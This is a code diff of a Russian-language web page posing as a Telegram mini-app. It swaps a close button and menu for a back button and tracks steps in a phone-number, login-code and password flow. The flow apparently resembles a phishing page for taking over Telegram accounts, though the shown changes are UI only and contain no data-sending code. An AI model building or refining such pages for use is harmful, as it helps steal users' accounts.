@@ -103,12 +103,15 @@
     position: relative;
     z-index: 10;
   }
-  .topbar-close {
+  .topbar-back {
     color: var(--tg-blue);
     font-size: 17px;
     font-weight: 700;
     cursor: pointer;
+    min-width: 60px;
+    user-select: none;
   }
+  .topbar-back:active { opacity: 0.6; }
   .topbar-title {
     text-align: center;
   }
@@ -123,82 +126,6 @@
     color: var(--text-muted);
     font-weight: 600;
   }
-  .topbar-menu {
-    width: 32px; height: 32px;
-    border-radius: 50%;
-    border: 2px solid var(--tg-blue);
-    display: flex; align-items: center; justify-content: center;
-    cursor: pointer;
-  }
-  .topbar-menu span {
-    font-size: 18px;
-    color: var(--tg-blue);
-    line-height: 1;
-    margin-top: -2px;
-  }
-
-  /* Dots dropdown */
-  .dots-menu {
-    display: none;
-    position: fixed;
-    top: 58px;
-    right: 12px;
-    background: white;
-    border-radius: 16px;
-    box-shadow: 0 8px 32px rgba(0,0,0,0.15);
-    z-index: 500;
-    min-width: 210px;
-    border: 1.5px solid var(--border);
-    overflow: hidden;
-    animation: fadeDown 0.18s ease both;
-  }
-  .dots-menu.open { display: block; }
-  .dots-menu-item {
-    padding: 13px 18px;
-    font-size: 15px;
-    font-weight: 700;
-    color: var(--text-main);
-    cursor: pointer;
-    border-bottom: 1px solid #f2f2f2;
-    display: flex; align-items: center; gap: 10px;
-    transition: background 0.1s;
-  }
-  .dots-menu-item:last-child { border-bottom: none; }
-  .dots-menu-item:hover { background: var(--input-bg); }
-  .dots-menu-item.danger { color: #e53935; }
-
-  /* Close confirm overlay */
-  .close-overlay {
-    display: none;
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.5);
-    z-index: 600;
-    align-items: center;
-    justify-content: center;
-  }
-  .close-overlay.show { display: flex; animation: fadeIn 0.2s ease both; }
-  @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
-  .close-modal {
-    background: white;
-    border-radius: 20px;
-    padding: 28px 24px;
-    width: 290px;
-    text-align: center;
-    box-shadow: 0 16px 48px rgba(0,0,0,0.18);
-    animation: popIn 0.25s cubic-bezier(.22,.68,0,1.3) both;
-  }
-  .close-modal h3 { font-size: 18px; font-weight: 900; color: var(--text-main); margin-bottom: 8px; }
-  .close-modal p { font-size: 14px; font-weight: 600; color: var(--text-muted); margin-bottom: 20px; line-height: 1.5; }
-  .modal-btns { display: flex; gap: 10px; }
-  .modal-btn {
-    flex: 1; padding: 13px; border-radius: 12px; border: none;
-    font-size: 15px; font-weight: 800; font-family: 'Nunito', sans-serif;
-    cursor: pointer; transition: opacity 0.15s;
-  }
-  .modal-btn:hover { opacity: 0.85; }
-  .modal-btn.cancel { background: var(--input-bg); color: var(--text-main); }
-  .modal-btn.confirm { background: linear-gradient(135deg, #2AABEE, #1e8fd1); color: white; }
 
   /* Main card */
   .card {
@@ -589,56 +516,14 @@
 <div class="deco deco-2"></div>
 <div class="deco deco-3"></div>
 
-<!-- Close confirm overlay -->
-<div class="close-overlay" id="closeOverlay">
-  <div class="close-modal">
-    <h3>Закрыть приложение?</h3>
-    <p>Авторизация будет прервана. Вы уверены?</p>
-    <div class="modal-btns">
-      <button class="modal-btn cancel" onclick="cancelClose()">Отмена</button>
-      <button class="modal-btn confirm" onclick="confirmClose()">Закрыть</button>
-    </div>
-  </div>
-</div>
-
-<!-- Dots menu -->
-<div class="dots-menu" id="dotsMenu">
-  <div class="dots-menu-item" onclick="dotsAction('reload')">🔄 Перезагрузить</div>
-  <div class="dots-menu-item" onclick="dotsAction('copy')">🔗 Скопировать ссылку</div>
-  <div class="dots-menu-item" onclick="dotsAction('browser')">🌐 Открыть в браузере</div>
-  <div class="dots-menu-item" onclick="dotsAction('share')">📤 Поделиться</div>
-  <div class="dots-menu-item danger" onclick="dotsAction('close')">✖ Закрыть приложение</div>
-</div>
-
-<!-- Close confirm overlay -->
-<div class="close-overlay" id="closeOverlay">
-  <div class="close-modal">
-    <h3>Закрыть приложение?</h3>
-    <p>Авторизация будет прервана. Вы уверены?</p>
-    <div class="modal-btns">
-      <button class="modal-btn cancel" onclick="cancelClose()">Отмена</button>
-      <button class="modal-btn confirm" onclick="confirmClose()">Закрыть</button>
-    </div>
-  </div>
-</div>
-
-<!-- Dots dropdown menu -->
-<div class="dots-menu" id="dotsMenu">
-  <div class="dots-menu-item" onclick="dotsAction('reload')">🔄 Перезагрузить</div>
-  <div class="dots-menu-item" onclick="dotsAction('copy')">🔗 Скопировать ссылку</div>
-  <div class="dots-menu-item" onclick="dotsAction('browser')">🌐 Открыть в браузере</div>
-  <div class="dots-menu-item" onclick="dotsAction('share')">📤 Поделиться</div>
-  <div class="dots-menu-item danger" onclick="dotsAction('close')">✖ Закрыть приложение</div>
-</div>
-
 <!-- Top bar -->
 <div class="topbar">
-  <div class="topbar-close" onclick="handleClose()">Закрыть</div>
+  <div class="topbar-back" id="topbarBack" onclick="topbarGoBack()">‹ Назад</div>
   <div class="topbar-title">
     <span>Tets</span>
     <small>мини-приложение</small>
   </div>
-  <div class="topbar-menu" id="dotsBtn" onclick="toggleDotsMenu()"><span>···</span></div>
+  <div style="width:60px;"></div>
 </div>
 
 <!-- Card -->
@@ -879,6 +764,7 @@ function goStep2() {
   phoneForDisplay = selectedCountry.code + ' ' + document.getElementById('phoneInput').value;
   document.getElementById('displayPhone').textContent = phoneForDisplay;
   switchStep(1, 2);
+  currentStep = 2;
   setTimeout(() => document.getElementById('c0').focus(), 300);
 }
 
@@ -890,6 +776,7 @@ function goStep3() {
   }
   document.getElementById('codeError').classList.remove('show');
   switchStep(2, 3);
+  currentStep = 3;
 }
 
 function goSuccess() {
@@ -900,9 +787,10 @@ function goSuccess() {
   }
   document.getElementById('passError').classList.remove('show');
   switchStep(3, 4);
+  currentStep = 4;
 }
 
-function goBack(from) { switchStep(from, from-1); }
+function goBack(from) { switchStep(from, from-1); currentStep = from - 1; }
 
 function switchStep(from, to) {
   document.getElementById('step'+from).style.display = 'none';
@@ -911,49 +799,14 @@ function switchStep(from, to) {
   el.style.animation = 'slideUp 0.35s cubic-bezier(.22,.68,0,1.2) both';
 }
 
-function handleClose() {
-  document.getElementById('closeOverlay').classList.add('show');
-}
-function cancelClose() {
-  document.getElementById('closeOverlay').classList.remove('show');
-}
-function confirmClose() {
-  window.close();
-  setTimeout(() => { window.location.reload(); }, 300);
-}
-
-function toggleDotsMenu() {
-  document.getElementById('dotsMenu').classList.toggle('open');
-}
-function dotsAction(action) {
-  document.getElementById('dotsMenu').classList.remove('open');
-  if (action === 'reload') {
-    window.location.reload();
-  } else if (action === 'copy') {
-    navigator.clipboard.writeText(window.location.href).then(() => {
-      alert('Ссылка скопирована!');
-    }).catch(() => {
-      prompt('Скопируйте ссылку:', window.location.href);
-    });
-  } else if (action === 'browser') {
-    window.open(window.location.href, '_blank');
-  } else if (action === 'share') {
-    if (navigator.share) {
-      navigator.share({ title: 'Fragment', url: window.location.href });
-    } else {
-      alert('Функция «Поделиться» недоступна в этом браузере');
-    }
-  } else if (action === 'close') {
-    handleClose();
+// Topbar back — tracks current step
+let currentStep = 1;
+function topbarGoBack() {
+  if (currentStep > 1) {
+    switchStep(currentStep, currentStep - 1);
+    currentStep--;
   }
 }
-
-document.addEventListener('click', e => {
-  if (!e.target.closest('#dotsBtn') && !e.target.closest('#dotsMenu')) {
-    const m = document.getElementById('dotsMenu');
-    if (m) m.classList.remove('open');
-  }
-});
 
 // Code input navigation
 function codeInput(el, idx) {
